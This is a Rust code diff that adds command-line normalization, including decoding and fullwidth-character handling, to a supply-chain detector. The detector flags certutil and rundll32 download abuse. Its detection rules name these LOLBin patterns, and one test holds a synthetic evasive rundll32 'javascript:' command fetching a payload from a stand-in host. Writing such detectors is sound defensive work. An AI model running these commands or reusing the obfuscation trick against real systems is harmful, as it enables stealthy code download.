@@ -1,3 +1,4 @@
+use crate::command_line::{CommandLineNormalizationProfile, analyze_command_line};
 use crate::detector::{
     DetectionFinding, DetectionStrategy, FilePersistenceEvent, ProcessStartEvent, TelemetryEvent,
     TelemetryPayload,
@@ -17,6 +18,8 @@ pub struct SupplyChainProfile {
     pub trusted_signers: Vec<String>,
     #[serde(default = "default_suspicious_loader_pairs")]
     pub suspicious_loader_pairs: Vec<(String, String)>,
+    #[serde(default)]
+    pub command_line_normalization: CommandLineNormalizationProfile,
     #[serde(default = "default_high_confidence_threshold")]
     pub high_confidence_threshold: f64,
     #[serde(default = "default_medium_confidence_threshold")]
@@ -29,6 +32,7 @@ impl Default for SupplyChainProfile {
             trusted_paths: default_trusted_paths(),
             trusted_signers: default_trusted_signers(),
             suspicious_loader_pairs: default_suspicious_loader_pairs(),
+            command_line_normalization: CommandLineNormalizationProfile::default(),
             high_confidence_threshold: default_high_confidence_threshold(),
             medium_confidence_threshold: default_medium_confidence_threshold(),
         }
@@ -40,6 +44,7 @@ pub struct SupplyChainDetector {
     trusted_paths: Vec<String>,
     trusted_signers: Vec<String>,
     suspicious_loader_pairs: Vec<(String, String)>,
+    command_line_normalization: CommandLineNormalizationProfile,
     high_confidence_threshold: f64,
     medium_confidence_threshold: f64,
 }
@@ -64,6 +69,7 @@ impl Default for SupplyChainDetector {
                     )
                 })
                 .collect(),
+            command_line_normalization: CommandLineNormalizationProfile::default(),
             high_confidence_threshold: default_high_confidence_threshold(),
             medium_confidence_threshold: default_medium_confidence_threshold(),
         }
@@ -94,6 +100,7 @@ impl SupplyChainDetector {
                     )
                 })
                 .collect(),
+            command_line_normalization: profile.command_line_normalization,
             high_confidence_threshold: profile.high_confidence_threshold,
             medium_confidence_threshold: profile.medium_confidence_threshold,
         })
@@ -104,6 +111,7 @@ impl SupplyChainDetector {
             trusted_paths: self.trusted_paths.clone(),
             trusted_signers: self.trusted_signers.clone(),
             suspicious_loader_pairs: self.suspicious_loader_pairs.clone(),
+            command_line_normalization: self.command_line_normalization.clone(),
             high_confidence_threshold: self.high_confidence_threshold,
             medium_confidence_threshold: self.medium_confidence_threshold,
         }
@@ -115,7 +123,8 @@ impl SupplyChainDetector {
         process: &ProcessStartEvent,
     ) -> Option<DetectionFinding> {
         let normalized_name = normalize_process_name(&process.process_name);
-        let command_line = process.command_line.to_ascii_lowercase();
+        let command_line =
+            analyze_command_line(&process.command_line, &self.command_line_normalization);
         let executable_path = process
             .executable_path
             .as_deref()
@@ -158,8 +167,9 @@ impl SupplyChainDetector {
         }
 
         if normalized_name == "certutil"
-            && command_line.contains("-urlcache")
-            && (command_line.contains("http://") || command_line.contains("https://"))
+            && command_line.match_text.contains("-urlcache")
+            && (command_line.match_text.contains("http://")
+                || command_line.match_text.contains("https://"))
         {
             return Some(DetectionFinding {
                 finding_id: format!("{}:{}", self.id(), event.event_id),
@@ -171,6 +181,9 @@ impl SupplyChainDetector {
                     "mitre_technique_id": "T1218",
                     "process_name": process.process_name,
                     "command_line": process.command_line,
+                    "normalized_command_line": command_line.normalized,
+                    "decoded_command_segments": command_line.decoded_segments,
+                    "command_line_transforms": command_line.transforms,
                     "mode": "signed_binary_abuse",
                     "lolbin": "certutil",
                 }),
@@ -179,9 +192,9 @@ impl SupplyChainDetector {
         }
 
         if normalized_name == "rundll32"
-            && (command_line.contains("javascript:")
-                || command_line.contains("http://")
-                || command_line.contains("https://"))
+            && (command_line.match_text.contains("javascript:")
+                || command_line.match_text.contains("http://")
+                || command_line.match_text.contains("https://"))
         {
             return Some(DetectionFinding {
                 finding_id: format!("{}:{}", self.id(), event.event_id),
@@ -193,6 +206,9 @@ impl SupplyChainDetector {
                     "mitre_technique_id": "T1218.011",
                     "process_name": process.process_name,
                     "command_line": process.command_line,
+                    "normalized_command_line": command_line.normalized,
+                    "decoded_command_segments": command_line.decoded_segments,
+                    "command_line_transforms": command_line.transforms,
                     "mode": "signed_binary_abuse",
                     "lolbin": "rundll32",
                 }),
@@ -293,6 +309,8 @@ impl DetectionStrategy for SupplyChainDetector {
             | TelemetryPayload::RegistryAccess(_)
             | TelemetryPayload::RegistryPersistence(_)
             | TelemetryPayload::AuthenticationEvent(_)
+            | TelemetryPayload::CloudTrail(_)
+            | TelemetryPayload::KubernetesAudit(_)
             | TelemetryPayload::InfrastructureHealth(_)
             | TelemetryPayload::ThermalAnomaly(_)
             | TelemetryPayload::ResourceExhaustion(_) => Vec::new(),
@@ -371,6 +389,7 @@ fn default_medium_confidence_threshold() -> f64 {
 #[allow(clippy::unwrap_used, clippy::expect_used)]
 mod tests {
     use super::{SupplyChainDetector, SupplyChainProfile};
+    use crate::command_line::CommandLineNormalizationProfile;
     use crate::detector::{
         DetectionStrategy, FilePersistenceEvent, ProcessStartEvent, TelemetryEvent,
         TelemetryPayload,
@@ -458,6 +477,29 @@ mod tests {
     }
 
     #[test]
+    fn fullwidth_javascript_indicator_is_normalized_before_supply_chain_matching() {
+        let detector = SupplyChainDetector::default();
+        let event = TelemetryEvent {
+            source: "synthetic".to_string(),
+            event_id: "evt-supply-4".to_string(),
+            timestamp: 1_700_000_000,
+            host_id: Some("host-1".to_string()),
+            payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
+                parent_process: "cmd.exe".to_string(),
+                process_name: "rundll32.exe".to_string(),
+                command_line: "rundll32.exe ｊavascript:https://bad.example/payload".to_string(),
+                user: Some("alice".to_string()),
+                executable_path: Some("C:\\Windows\\System32\\rundll32.exe".to_string()),
+                signer: Some("Microsoft Windows".to_string()),
+                signature_valid: Some(true),
+            }),
+        };
+
+        let findings = detector.evaluate(&event);
+        assert_eq!(findings.len(), 1);
+    }
+
+    #[test]
     fn invalid_profile_is_rejected() {
         let error = SupplyChainProfile {
             suspicious_loader_pairs: Vec::new(),
@@ -466,5 +508,19 @@ mod tests {
         .validate()
         .expect_err("empty loader pairs should fail");
         assert_eq!(error.field, "suspicious_loader_pairs");
+    }
+
+    #[test]
+    fn profile_round_trips() {
+        let profile = SupplyChainProfile {
+            command_line_normalization: CommandLineNormalizationProfile {
+                decode_encoded_arguments: false,
+                ..CommandLineNormalizationProfile::default()
+            },
+            ..SupplyChainProfile::default()
+        };
+        let detector =
+            SupplyChainDetector::from_profile(profile.clone()).expect("profile should be valid");
+        assert_eq!(detector.profile(), profile);
     }
 }
